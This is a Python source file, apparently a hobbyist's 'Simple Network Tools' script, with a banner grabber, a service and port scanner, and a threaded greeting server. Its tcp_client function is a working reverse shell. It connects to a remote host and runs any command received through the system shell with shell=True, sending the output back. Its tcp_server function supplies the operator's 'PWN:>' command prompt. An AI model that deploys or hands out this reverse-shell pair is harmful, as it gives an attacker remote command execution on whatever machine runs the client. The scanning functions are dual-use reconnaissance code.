"""
Simple Network Tools


~ Scanners ~

Banner Grab - Simple HTTP GET request

service scan - socket.getservport() function using a range of ports

port scan - Search for live ports by attempting a tcp socket connection



~ Clients ~

tcp_client(host='localhost', port=9090) - Raw shell client



~ Servers ~

tcp_server(host='localhost', port=9090) - Raw shell server

GreetClient() - Send a simple text string with current time via socketserver.py
"""

#   TODO: Convert script to console application (sys.argv's and whatnot)
#   TODO: Finish tcp_server() response - Line 167
#   TODO: Integrate start_server() into GreetClient()
#   TODO: Clean docstring


import sys
import time
import subprocess
import socket
import socketserver


##########################
#        SCANNERS        #
##########################


def banner_grab(host):
    s_client = socket.socket()
    s_client.connect((host, 80))
    s_client.send(b"GET / HTTP/1.0\r\n\r\n")

    chunks = []
    while True:
        chunk = s_client.recv(16384)
        try:
            if not chunk:
                break
            chunks.append(chunk)
        except socket.error as err:
            print('Exception: {}'.format(err))

    s_client.close()
    return '{}'.format(chunks)


def service_scan():
    for num in range(1, 65536):
        try:
            if socket.getservbyport(num) is not None:
                print("Port:{} - {}".format(num, socket.getservbyport(num)))
        except socket.error:
            pass


def port_scan(*port):
    """
    :param: Port()
    :return: Print()


    """

    if '-' in str(port[0]):
        port = port[0].split("-")
        port = (_ for _ in range(int(port[0]), int(port[1]) + 1))

    for num in port:
        print("Connecting to port {}: ".format(num), end='')
        try:
            s = socket.socket()
            s.settimeout(2)
            # Connect to local network subnet - /24
            s.connect((socket.gethostbyname_ex(socket.gethostname())[-1][-1], int(num)))
            print("[!] Open!")
        except socket.error as err:
            print("{}".format(err))
        except (KeyboardInterrupt, SystemExit, EOFError):
            print("[!] Interrupt encountered. Exiting")


############################
#         Clients          #
############################


def tcp_client(host='localhost', port=9090):
    try:
        s = socket.socket()
        print("[*] Connecting to {} on port {}".format(host, port))
        s.connect((host, port))
        print("[*] Connected!")

    except socket.error as err:
        print('[!] Connection Error: {}'.format(err))
        s.close()
        sys.exit()

    while True:
        try:
            print("Waiting for data...")
            data = s.recv(10240)
            if len(data) > 0:
                print(data.decode())
                command = subprocess.run(data.decode(), shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
                response = command.stdout + command.stderr
                s.send(str(response).encode())
            else:
                print("[!] Data Error: Breaking...")
                break

        except socket.error as err:
            print('[!] Socket Error: {}'.format(err))
            s.close()
            sys.exit()


#############################
#          Servers          #
#############################


def tcp_server(host='localhost', port=9090):
    try:
        s = socket.socket()
        print("[*] Binding to {}:{}".format(host, port))
        s.bind((host, port))
        print("[*] Listen for connection...")
        s.listen(1)
        conn, address = s.accept()
        print("[*] Connection from {}:{}".format(address[0], address[1]))

    except socket.error as err:
        print('[!] Server Creation Error: {}'.format(err))
        s.close()
        sys.exit()

    except (KeyboardInterrupt, SystemExit, EOFError) as err:
        print("[!] {} Interrupt encountered. Exiting...\n".format(err))
        s.close()
        sys.exit()

    while True:
        try:
            cmd = input("PWN:>").encode()
            conn.send(cmd)

            response = conn.recv(10240)
            if len(response) > 0:
                decode = response.decode()

        except socket.error as err:
            print('[!] Socket Error: {}\n[*] Restarting...'.format(err))
            s.close()
            conn.close()
            tcp_server()

        except (KeyboardInterrupt, SystemExit, EOFError) as err:
            print("[!] {}\nExiting...".format(err))
            s.close()
            conn.close()
            sys.exit()


class GreetClient(socketserver.BaseRequestHandler):
    def handle(self):
        t = '{}'.format(time.ctime())
        print("[*] Incoming Connection from {}".format(socket.gethostname()))
        msg = 'Hello, from: {}\nCurrent Time: {}'.format(socket.gethostname(), t)
        self.request.sendall(msg.encode())
        print("[*] Waiting for new connection...\n")


def start_server(server, host, port):
    try:
        s = socketserver.ThreadingTCPServer((host, port), server)
        print("[*] Starting {} server @ {}\n".format(server.__name__, (host, port)))
        s.serve_forever()
    except (KeyboardInterrupt, SystemExit):
        print("[*] Interrupt encountered. Exiting...\n")
        s.shutdown()


############################
#           Main           #
############################


if __name__ == '__main__':

    start_server(GreetClient, 'localhost', 9090)
